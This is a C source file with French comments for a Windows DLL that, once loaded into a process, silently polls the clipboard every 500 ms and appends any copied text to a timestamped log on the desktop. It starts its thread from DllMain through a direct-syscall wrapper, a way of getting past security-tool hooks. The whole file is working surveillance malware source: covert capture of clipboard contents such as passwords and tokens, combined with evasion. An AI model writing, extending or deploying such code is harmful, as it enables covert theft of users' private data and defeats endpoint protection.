/**
 * @file clipboard-logger.c
 * @brief Version alternative de la DLL de surveillance du presse-papiers.
 * 
 * Cette version n'utilise pas de fenêtre invisible. Elle se base sur la fonction
 * GetClipboardSequenceNumber pour détecter les changements par scrutation (polling)
 * à intervalle régulier.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600 // Windows Vista ou supérieur
#endif
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>
#include <direct-syscalls.h>

// Intervalle de scrutation en millisecondes (ex: 500ms)
#define POLLING_INTERVAL 500
#define LOG_FILE_NAME "clipboard_log_polling.txt"

// Variables globales
HINSTANCE g_hInstance = NULL;
HANDLE g_hThread = NULL;
BOOL g_bRunning = TRUE;

/**
 * @brief Récupère le chemin du fichier de log sur le bureau.
 */
void GetLogFilePath(char* buffer, size_t size) {
    CHAR desktopPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath))) {
        snprintf(buffer, size, "%s\\%s", desktopPath, LOG_FILE_NAME);
    } else {
        snprintf(buffer, size, ".\\%s", LOG_FILE_NAME);
    }
}

/**
 * @brief Logue le texte dans le fichier sur le bureau.
 */
void LogClipboardText(const char* text) {
    if (!text || text[0] == '\0') return;

    char logPath[MAX_PATH];
    GetLogFilePath(logPath, sizeof(logPath));

    FILE* f = fopen(logPath, "a");
    if (f) {
        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        char timeStr[64];
        strftime(timeStr, sizeof(timeStr), "[%Y-%m-%d %H:%M:%S]", t);
        
        fprintf(f, "%s (Polling)\n%s\n-----------------------------------\n", timeStr, text);
        fclose(f);
    }
}

/**
 * @brief Fonction principale du thread de scrutation.
 */
DWORD WINAPI PollingThread(LPVOID lpParam) {
    DWORD dwLastSequence = 0;
    
    // Initialisation du numéro de séquence actuel
    dwLastSequence = GetClipboardSequenceNumber();

    while (g_bRunning) {
        DWORD dwCurrentSequence = GetClipboardSequenceNumber();

        // Si le numéro de séquence a changé, le contenu du presse-papiers a été modifié
        if (dwCurrentSequence != dwLastSequence) {
            dwLastSequence = dwCurrentSequence;

            if (OpenClipboard(NULL)) {
                HANDLE hData = GetClipboardData(CF_TEXT);
                if (hData) {
                    char* pszText = (char*)GlobalLock(hData);
                    if (pszText) {
                        LogClipboardText(pszText);
                        GlobalUnlock(hData);
                    }
                }
                CloseClipboard();
            }
        }

        // Attente avant la prochaine vérification
        Sleep(POLLING_INTERVAL);
    }

    return 0;
}

/**
 * @brief Point d'entrée de la DLL.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    g_hInstance = hinstDLL;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            g_bRunning = TRUE;
            dCreateThreadEx(
                &g_hThread, 
                THREAD_ALL_ACCESS, 
                NULL,
                GetCurrentProcess(), 
                PollingThread,
                NULL,0,0,0,0,NULL);
            break;

        case DLL_PROCESS_DETACH:
            g_bRunning = FALSE;
            if (g_hThread) {
                WaitForSingleObject(g_hThread, 1000);
                CloseHandle(g_hThread);
            }
            break;
    }
    return TRUE;
}
